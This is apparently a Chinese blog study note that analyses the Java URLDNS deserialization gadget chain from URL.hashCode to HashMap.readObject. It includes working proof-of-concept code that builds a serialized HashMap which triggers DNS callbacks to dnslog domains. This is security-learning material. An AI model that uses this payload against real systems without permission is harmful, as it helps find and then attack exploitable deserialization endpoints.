---
title: "CC重启之URLDNS补课"
onlyTitle: true
date: 2024-7-19 19:27:00
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B888.jpg

---



在写CC6的时候，发现后半截是URLDNS的链，来重新构造一遍URLDNS。

他妈的，护网还被鸽了，面试是没挂过的，项目是没去过的。

## URLDNS

### DNS解析

漏洞触发点在InetAddress#getByName()能触发DNS解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png)

同样来自于InetAddress的getHostAddress调用了getByName方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png)

抽象类java.net.URLStreamHandler的hashCode调用了getHostAddress。注意这里是需要URL参数的hashCode()，而不是贼多方法都调用的那个无参hashCode()。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png)

这个有参hashCode只在URL类中使用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png)

URL.hashCode()如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png)

那我们如何传参向hashCode呢？handler已经定义为URLStreamHandler了，this是把当前对象传进去。

>在URL类中先声明了抽象类URLStreamHandler的变量，后面会根据协议选择用哪个子类来处理这个URL
>
>>Java中可以先定义一个抽象类的变量，如URLStreamHandler handler，但不能用这个变量来实例化一个对象
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png)

URL有公开的构造函数，我们用最简单那个

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png)

我们用dnslog试一下（记得要加协议，构造函数传递到最后一个会进行判断）

```java
public static void main(String[] args) throws Exception {
    URL url = new URL("http://845yoh.dnslog.cn");
    url.hashCode();
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png)

完全是没问题

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png)



### 链接到readObject

调用URL.hashCode()的地方很多

官方给出的下一步是HashMap#hash()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png)

正好在HashMap的readObject里调用了hash()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png)

读一下上面那张图最后一个循环，循环从map中读取key和value。我们搞一个key为url的map去反序列化就行了。

我们先序列化

```java
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://icguiixgku.dgrh3.cn");
//        url.hashCode();
        HashMap<Object, Object> map = new HashMap<>();
        map.put(url,"godown");
        serialize(map);
    }
```

发现只是序列化就触发了DNS请求（我是太刀侠，提前预知了这里会DNS请求

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png)

发现在map.put的时候就调用了一遍hash

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png)

这没道理的，还没打到别人电脑上，DNS平台就有请求了，影响判断。我们得让put不触发dns请求

> 至于为什么要通过反射修改URL类而不是HashMap类，是因为HashMap本身并没有提供直接修改key的方法。这是因为Map接口的设计原则之一就是key的不可变性，一旦一个键值对被放入Map中，它的键就不能改变。如果改变了key，那么Map就无法定位到原来的条目。
>
> 如果你需要“修改”一个HashMap中的key，实际上的操作流程是：使用remove()方法移除旧的键值对。使用put()方法插入新的键值对。
>
> HashMap内键值对以Node的形式存储，链表链接，超过一定阈值还会变成红黑树

再倒回来看URL#hashCode()，如果hashCode值不为-1，则直接返回。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png)

那我们通过反射，在put前把值改为不等于-1，put后改为-1

完整代码如下：

```java
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://c6lmkl.dnslog.cn");
//        url.hashCode();
        HashMap<Object, Object> map = new HashMap<>();
        Field hashCode = url.getClass().getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,0);
        map.put(url,"godown");
        hashCode.set(url,-1);
        serialize(map);
//        unserialize("ser.bin");
    }
```

现在就不会误报了。由于DNS缓存刷新时间的问题，你需要多发几次包或者等一会儿再运行。

完整代码：

```java
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://c6lmkl.dnslog.cn");
        HashMap<Object, Object> map = new HashMap<>();
        Field hashCode = url.getClass().getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,0);
        map.put(url,"godown");
        hashCode.set(url,-1);
        serialize(map);
    }
```



漏洞应该是作者翻看URL这个与外界通信的类时发现的。有超多地方都调用的hashCode，仔细一看hashCode进一步进行了DNS解析。进一步寻找readObject触发到hashCode的链子。而不是作者从InetAddress开始找的，只是本文按顺序如此分析。